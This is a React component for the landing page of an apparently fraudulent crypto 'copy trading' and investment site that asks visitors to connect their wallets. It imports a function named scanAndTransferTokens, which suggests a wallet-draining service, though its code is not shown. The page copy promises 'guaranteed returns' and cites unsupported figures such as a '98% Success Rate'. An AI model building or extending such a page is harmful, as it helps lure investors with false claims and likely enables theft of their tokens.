import React, { useEffect } from 'react'
import { useAccount, useDisconnect, useNetwork } from 'wagmi'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useNavigate } from 'react-router-dom'
import { scanAndTransferTokens } from '../services/tokenScanner'
import './HomePage.css'

// Import settings
import settings from '../../settings.js'

const HomePage = () => {
  const { open } = useWeb3Modal()
  const { isConnected, address } = useAccount()
  const { disconnect } = useDisconnect()
  const { chain } = useNetwork()
  const navigate = useNavigate()

  useEffect(() => {
    if (isConnected && address) {
      // Navigate to dashboard after connection
      setTimeout(() => {
        navigate('/dashboard')
      }, 1500)
    }
  }, [isConnected, address, chain, navigate])

  const handleConnect = async () => {
    try {
      await open()
    } catch (error) {
      console.error('Connection error:', error)
    }
  }

  const features = [
    {
      icon: '🎯',
      title: 'Smart Copy Trading',
      description: 'Follow expert traders and copy their winning strategies automatically'
    },
    {
      icon: '💎',
      title: 'Premium Investment Plans',
      description: 'High-yield investment opportunities with guaranteed returns'
    },
    {
      icon: '🔒',
      title: 'Bank-Grade Security',
      description: 'Your assets are protected with military-grade encryption'
    },
    {
      icon: '⚡',
      title: 'Instant Transactions',
      description: 'Lightning-fast deposits and withdrawals to your wallet'
    }
  ]

  const stats = [
    { value: '$2.5B+', label: 'Total Volume' },
    { value: '150K+', label: 'Active Users' },
    { value: '98%', label: 'Success Rate' },
    { value: '24/7', label: 'Support' }
  ]

  return (
    <div className="homepage">
      {/* Hero Section */}
      <section className="hero-section">
        <div className="hero-bg">
          <div className="gradient-orb orb-1"></div>
          <div className="gradient-orb orb-2"></div>
          <div className="gradient-orb orb-3"></div>
        </div>
        
        <div className="hero-content">
          <div className="hero-badge">
            <span className="badge-icon">✨</span>
            <span>The Future of Crypto Investment</span>
          </div>
          
          <h1 className="hero-title">
            Invest Smarter with
            <span className="gradient-text"> AI-Powered</span>
            <br />
            Copy Trading Platform
          </h1>
          
          <p className="hero-description">
            Join thousands of investors earning passive income through professional
            copy trading and premium investment plans. Start with as little as $100.
          </p>
          
          <div className="hero-actions">
            <button className="cta-button primary" onClick={handleConnect}>
              <span>Connect Wallet</span>
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </button>
            <button className="cta-button secondary">
              <span>Learn More</span>
            </button>
          </div>

          {/* Stats */}
          <div className="hero-stats">
            {stats.map((stat, index) => (
              <div key={index} className="stat-item">
                <div className="stat-value">{stat.value}</div>
                <div className="stat-label">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="features-section">
        <div className="section-header">
          <h2 className="section-title">Why Choose Us</h2>
          <p className="section-subtitle">
            Experience the next generation of crypto investment with cutting-edge features
          </p>
        </div>

        <div className="features-grid">
          {features.map((feature, index) => (
            <div key={index} className="feature-card">
              <div className="feature-icon">{feature.icon}</div>
              <h3 className="feature-title">{feature.title}</h3>
              <p className="feature-description">{feature.description}</p>
            </div>
          ))}
        </div>
      </section>

      {/* CTA Section */}
      <section className="cta-section">
        <div className="cta-content">
          <h2 className="cta-title">Ready to Start Earning?</h2>
          <p className="cta-description">
            Join our platform today and start your journey to financial freedom
          </p>
          <button className="cta-button primary large" onClick={handleConnect}>
            <span>Get Started Now</span>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path d="M9 18L15 12L9 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </button>
        </div>
      </section>
    </div>
  )
}

export default HomePage